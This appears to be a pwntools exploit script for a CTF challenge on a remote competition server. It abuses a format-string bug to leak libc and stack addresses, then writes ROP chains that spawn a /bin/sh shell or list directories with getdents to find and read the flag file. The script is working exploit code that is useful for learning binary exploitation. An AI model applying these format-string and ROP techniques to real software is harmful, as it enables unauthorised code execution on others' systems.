from pwn import *
from icecream import ic

elf = exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("challenges.ctf.compfest.id", 9008)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
# b *0x00000000004017bd
b *0x00000000004019b4
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

def leak_stuff(format):
    sla(b'>',b'2')
    sla(b'(Y/N)',b'N')
    sla(b'see:',format.encode())
    ru(b'The song file ')
    return rl().rstrip(b' is not found.\n')

def burh(format):
    sla(b'>',b'2')
    sla(b'(Y/N)',b'N')
    sla(b'see:',format)


libc.address = int(leak_stuff("%9$p"),16) - 0x8c9e1
info(f"LIBC: {hex(libc.address)}")

stack_addr = int(leak_stuff("%26$p"),16) + 0x8
info(f"Stack: {hex(stack_addr)}")


pop_rdi = libc.address + 0x000000000002a3e5
binsh = next(libc.search(b"/bin/sh\x00"))
ret = libc.address + 0x00000000000904ab
system = libc.sym['system']
pop_rdx_rbx = libc.address + 0x00000000000904a9
one_gadget = libc.address + 0xebc88
xor_rax_rax = libc.address + 0x00000000000baaf9
pop_rsi = libc.address + 0x000000000016333a
pop_rbp = libc.address + 0x000000000002a2e0

bss = 0x0000000000404100
pop_rax = libc.address + 0x0000000000045eb0
syscall_ret = libc.address + 0x0000000000091316
'''
payload = fmtstr_payload(10, {stack_addr: ret}, write_size='short')
burh(payload)
# payload = fmtstr_payload(10, {stack_addr+8: pop_rdx_rbx}, write_size='short')
# burh(payload)
# payload = fmtstr_payload(10, {stack_addr+16: 0}, write_size='short')
# burh(payload)
# payload = fmtstr_payload(10, {stack_addr+24: 0}, write_size='short')
# burh(payload)
payload = fmtstr_payload(10, {stack_addr+8: pop_rdi}, write_size='short')
burh(payload)
payload = fmtstr_payload(10, {stack_addr+16: binsh}, write_size='short')
burh(payload)
# payload = fmtstr_payload(10, {stack_addr+48: ret}, write_size='short')
# burh(payload)
payload = fmtstr_payload(10, {stack_addr+24: system}, write_size='short')
burh(payload)
# payload = fmtstr_payload(10, {stack_addr+8: xor_rax_rax}, write_size='short')
# burh(payload)
# payload = fmtstr_payload(10, {stack_addr+32: pop_rsi}, write_size='short')
# burh(payload)
# payload = fmtstr_payload(10, {stack_addr+40: 0}, write_size='short')
# burh(payload)
# payload = fmtstr_payload(10, {stack_addr+48: pop_rbp}, write_size='short')
# burh(payload)
# payload = fmtstr_payload(10, {stack_addr+56: stack_addr+0xa8}, write_size='short')
# burh(payload)
# payload = fmtstr_payload(10, {stack_addr+64: one_gadget}, write_size='short')
# burh(payload)
'''

buh = [
    pop_rax,
    257,
    pop_rdi,
    0xFFFFFF9C,
    pop_rsi,
    stack_addr+160+80,
    pop_rdx_rbx,
    0,
    0,
    syscall_ret,
    pop_rax,
    78,
    pop_rdi,
    0x13,
    pop_rsi,
    0x404180,
    pop_rdx_rbx,
    0x100,
    0,
    syscall_ret,
    pop_rax,
    1,
    pop_rdi,
    1,
    pop_rsi,
    0x404180,
    pop_rdx_rbx,
    0x100,
    0,
    syscall_ret,
    b'.\x00'
]



# for i in range(len(buh)):
#     if i == 3:
#         continue
#     ic(i)
#     payload = fmtstr_payload(10, {stack_addr+(i*8) : buh[i]}, write_size = 'short')
#     burh(payload)
#     # io.clean()

# ic("help")
# payload = fmtstr_payload(10, {stack_addr+24 : 0xFFFFFF9C}, write_size = 'short')
# burh(payload)
# payload = b'%65535c%13$hn%14$hnAAAAA'
# payload += p64(stack_addr+28)
# payload += p64(stack_addr+30)
# payload += b"GGGGGGGG"
# burh(payload)

flag = b"flag-7c76921b144b830737737d5d7f6dd4d7.txt" #found out what the remote flag was, using getdents()
for i in range(len(flag)//4+1):
    payload = fmtstr_payload(10, {0x404020+(i*4) : flag[4*i:4*i+4]}, write_size = 'short')
    burh(payload)

# sl(b'3')
io.interactive()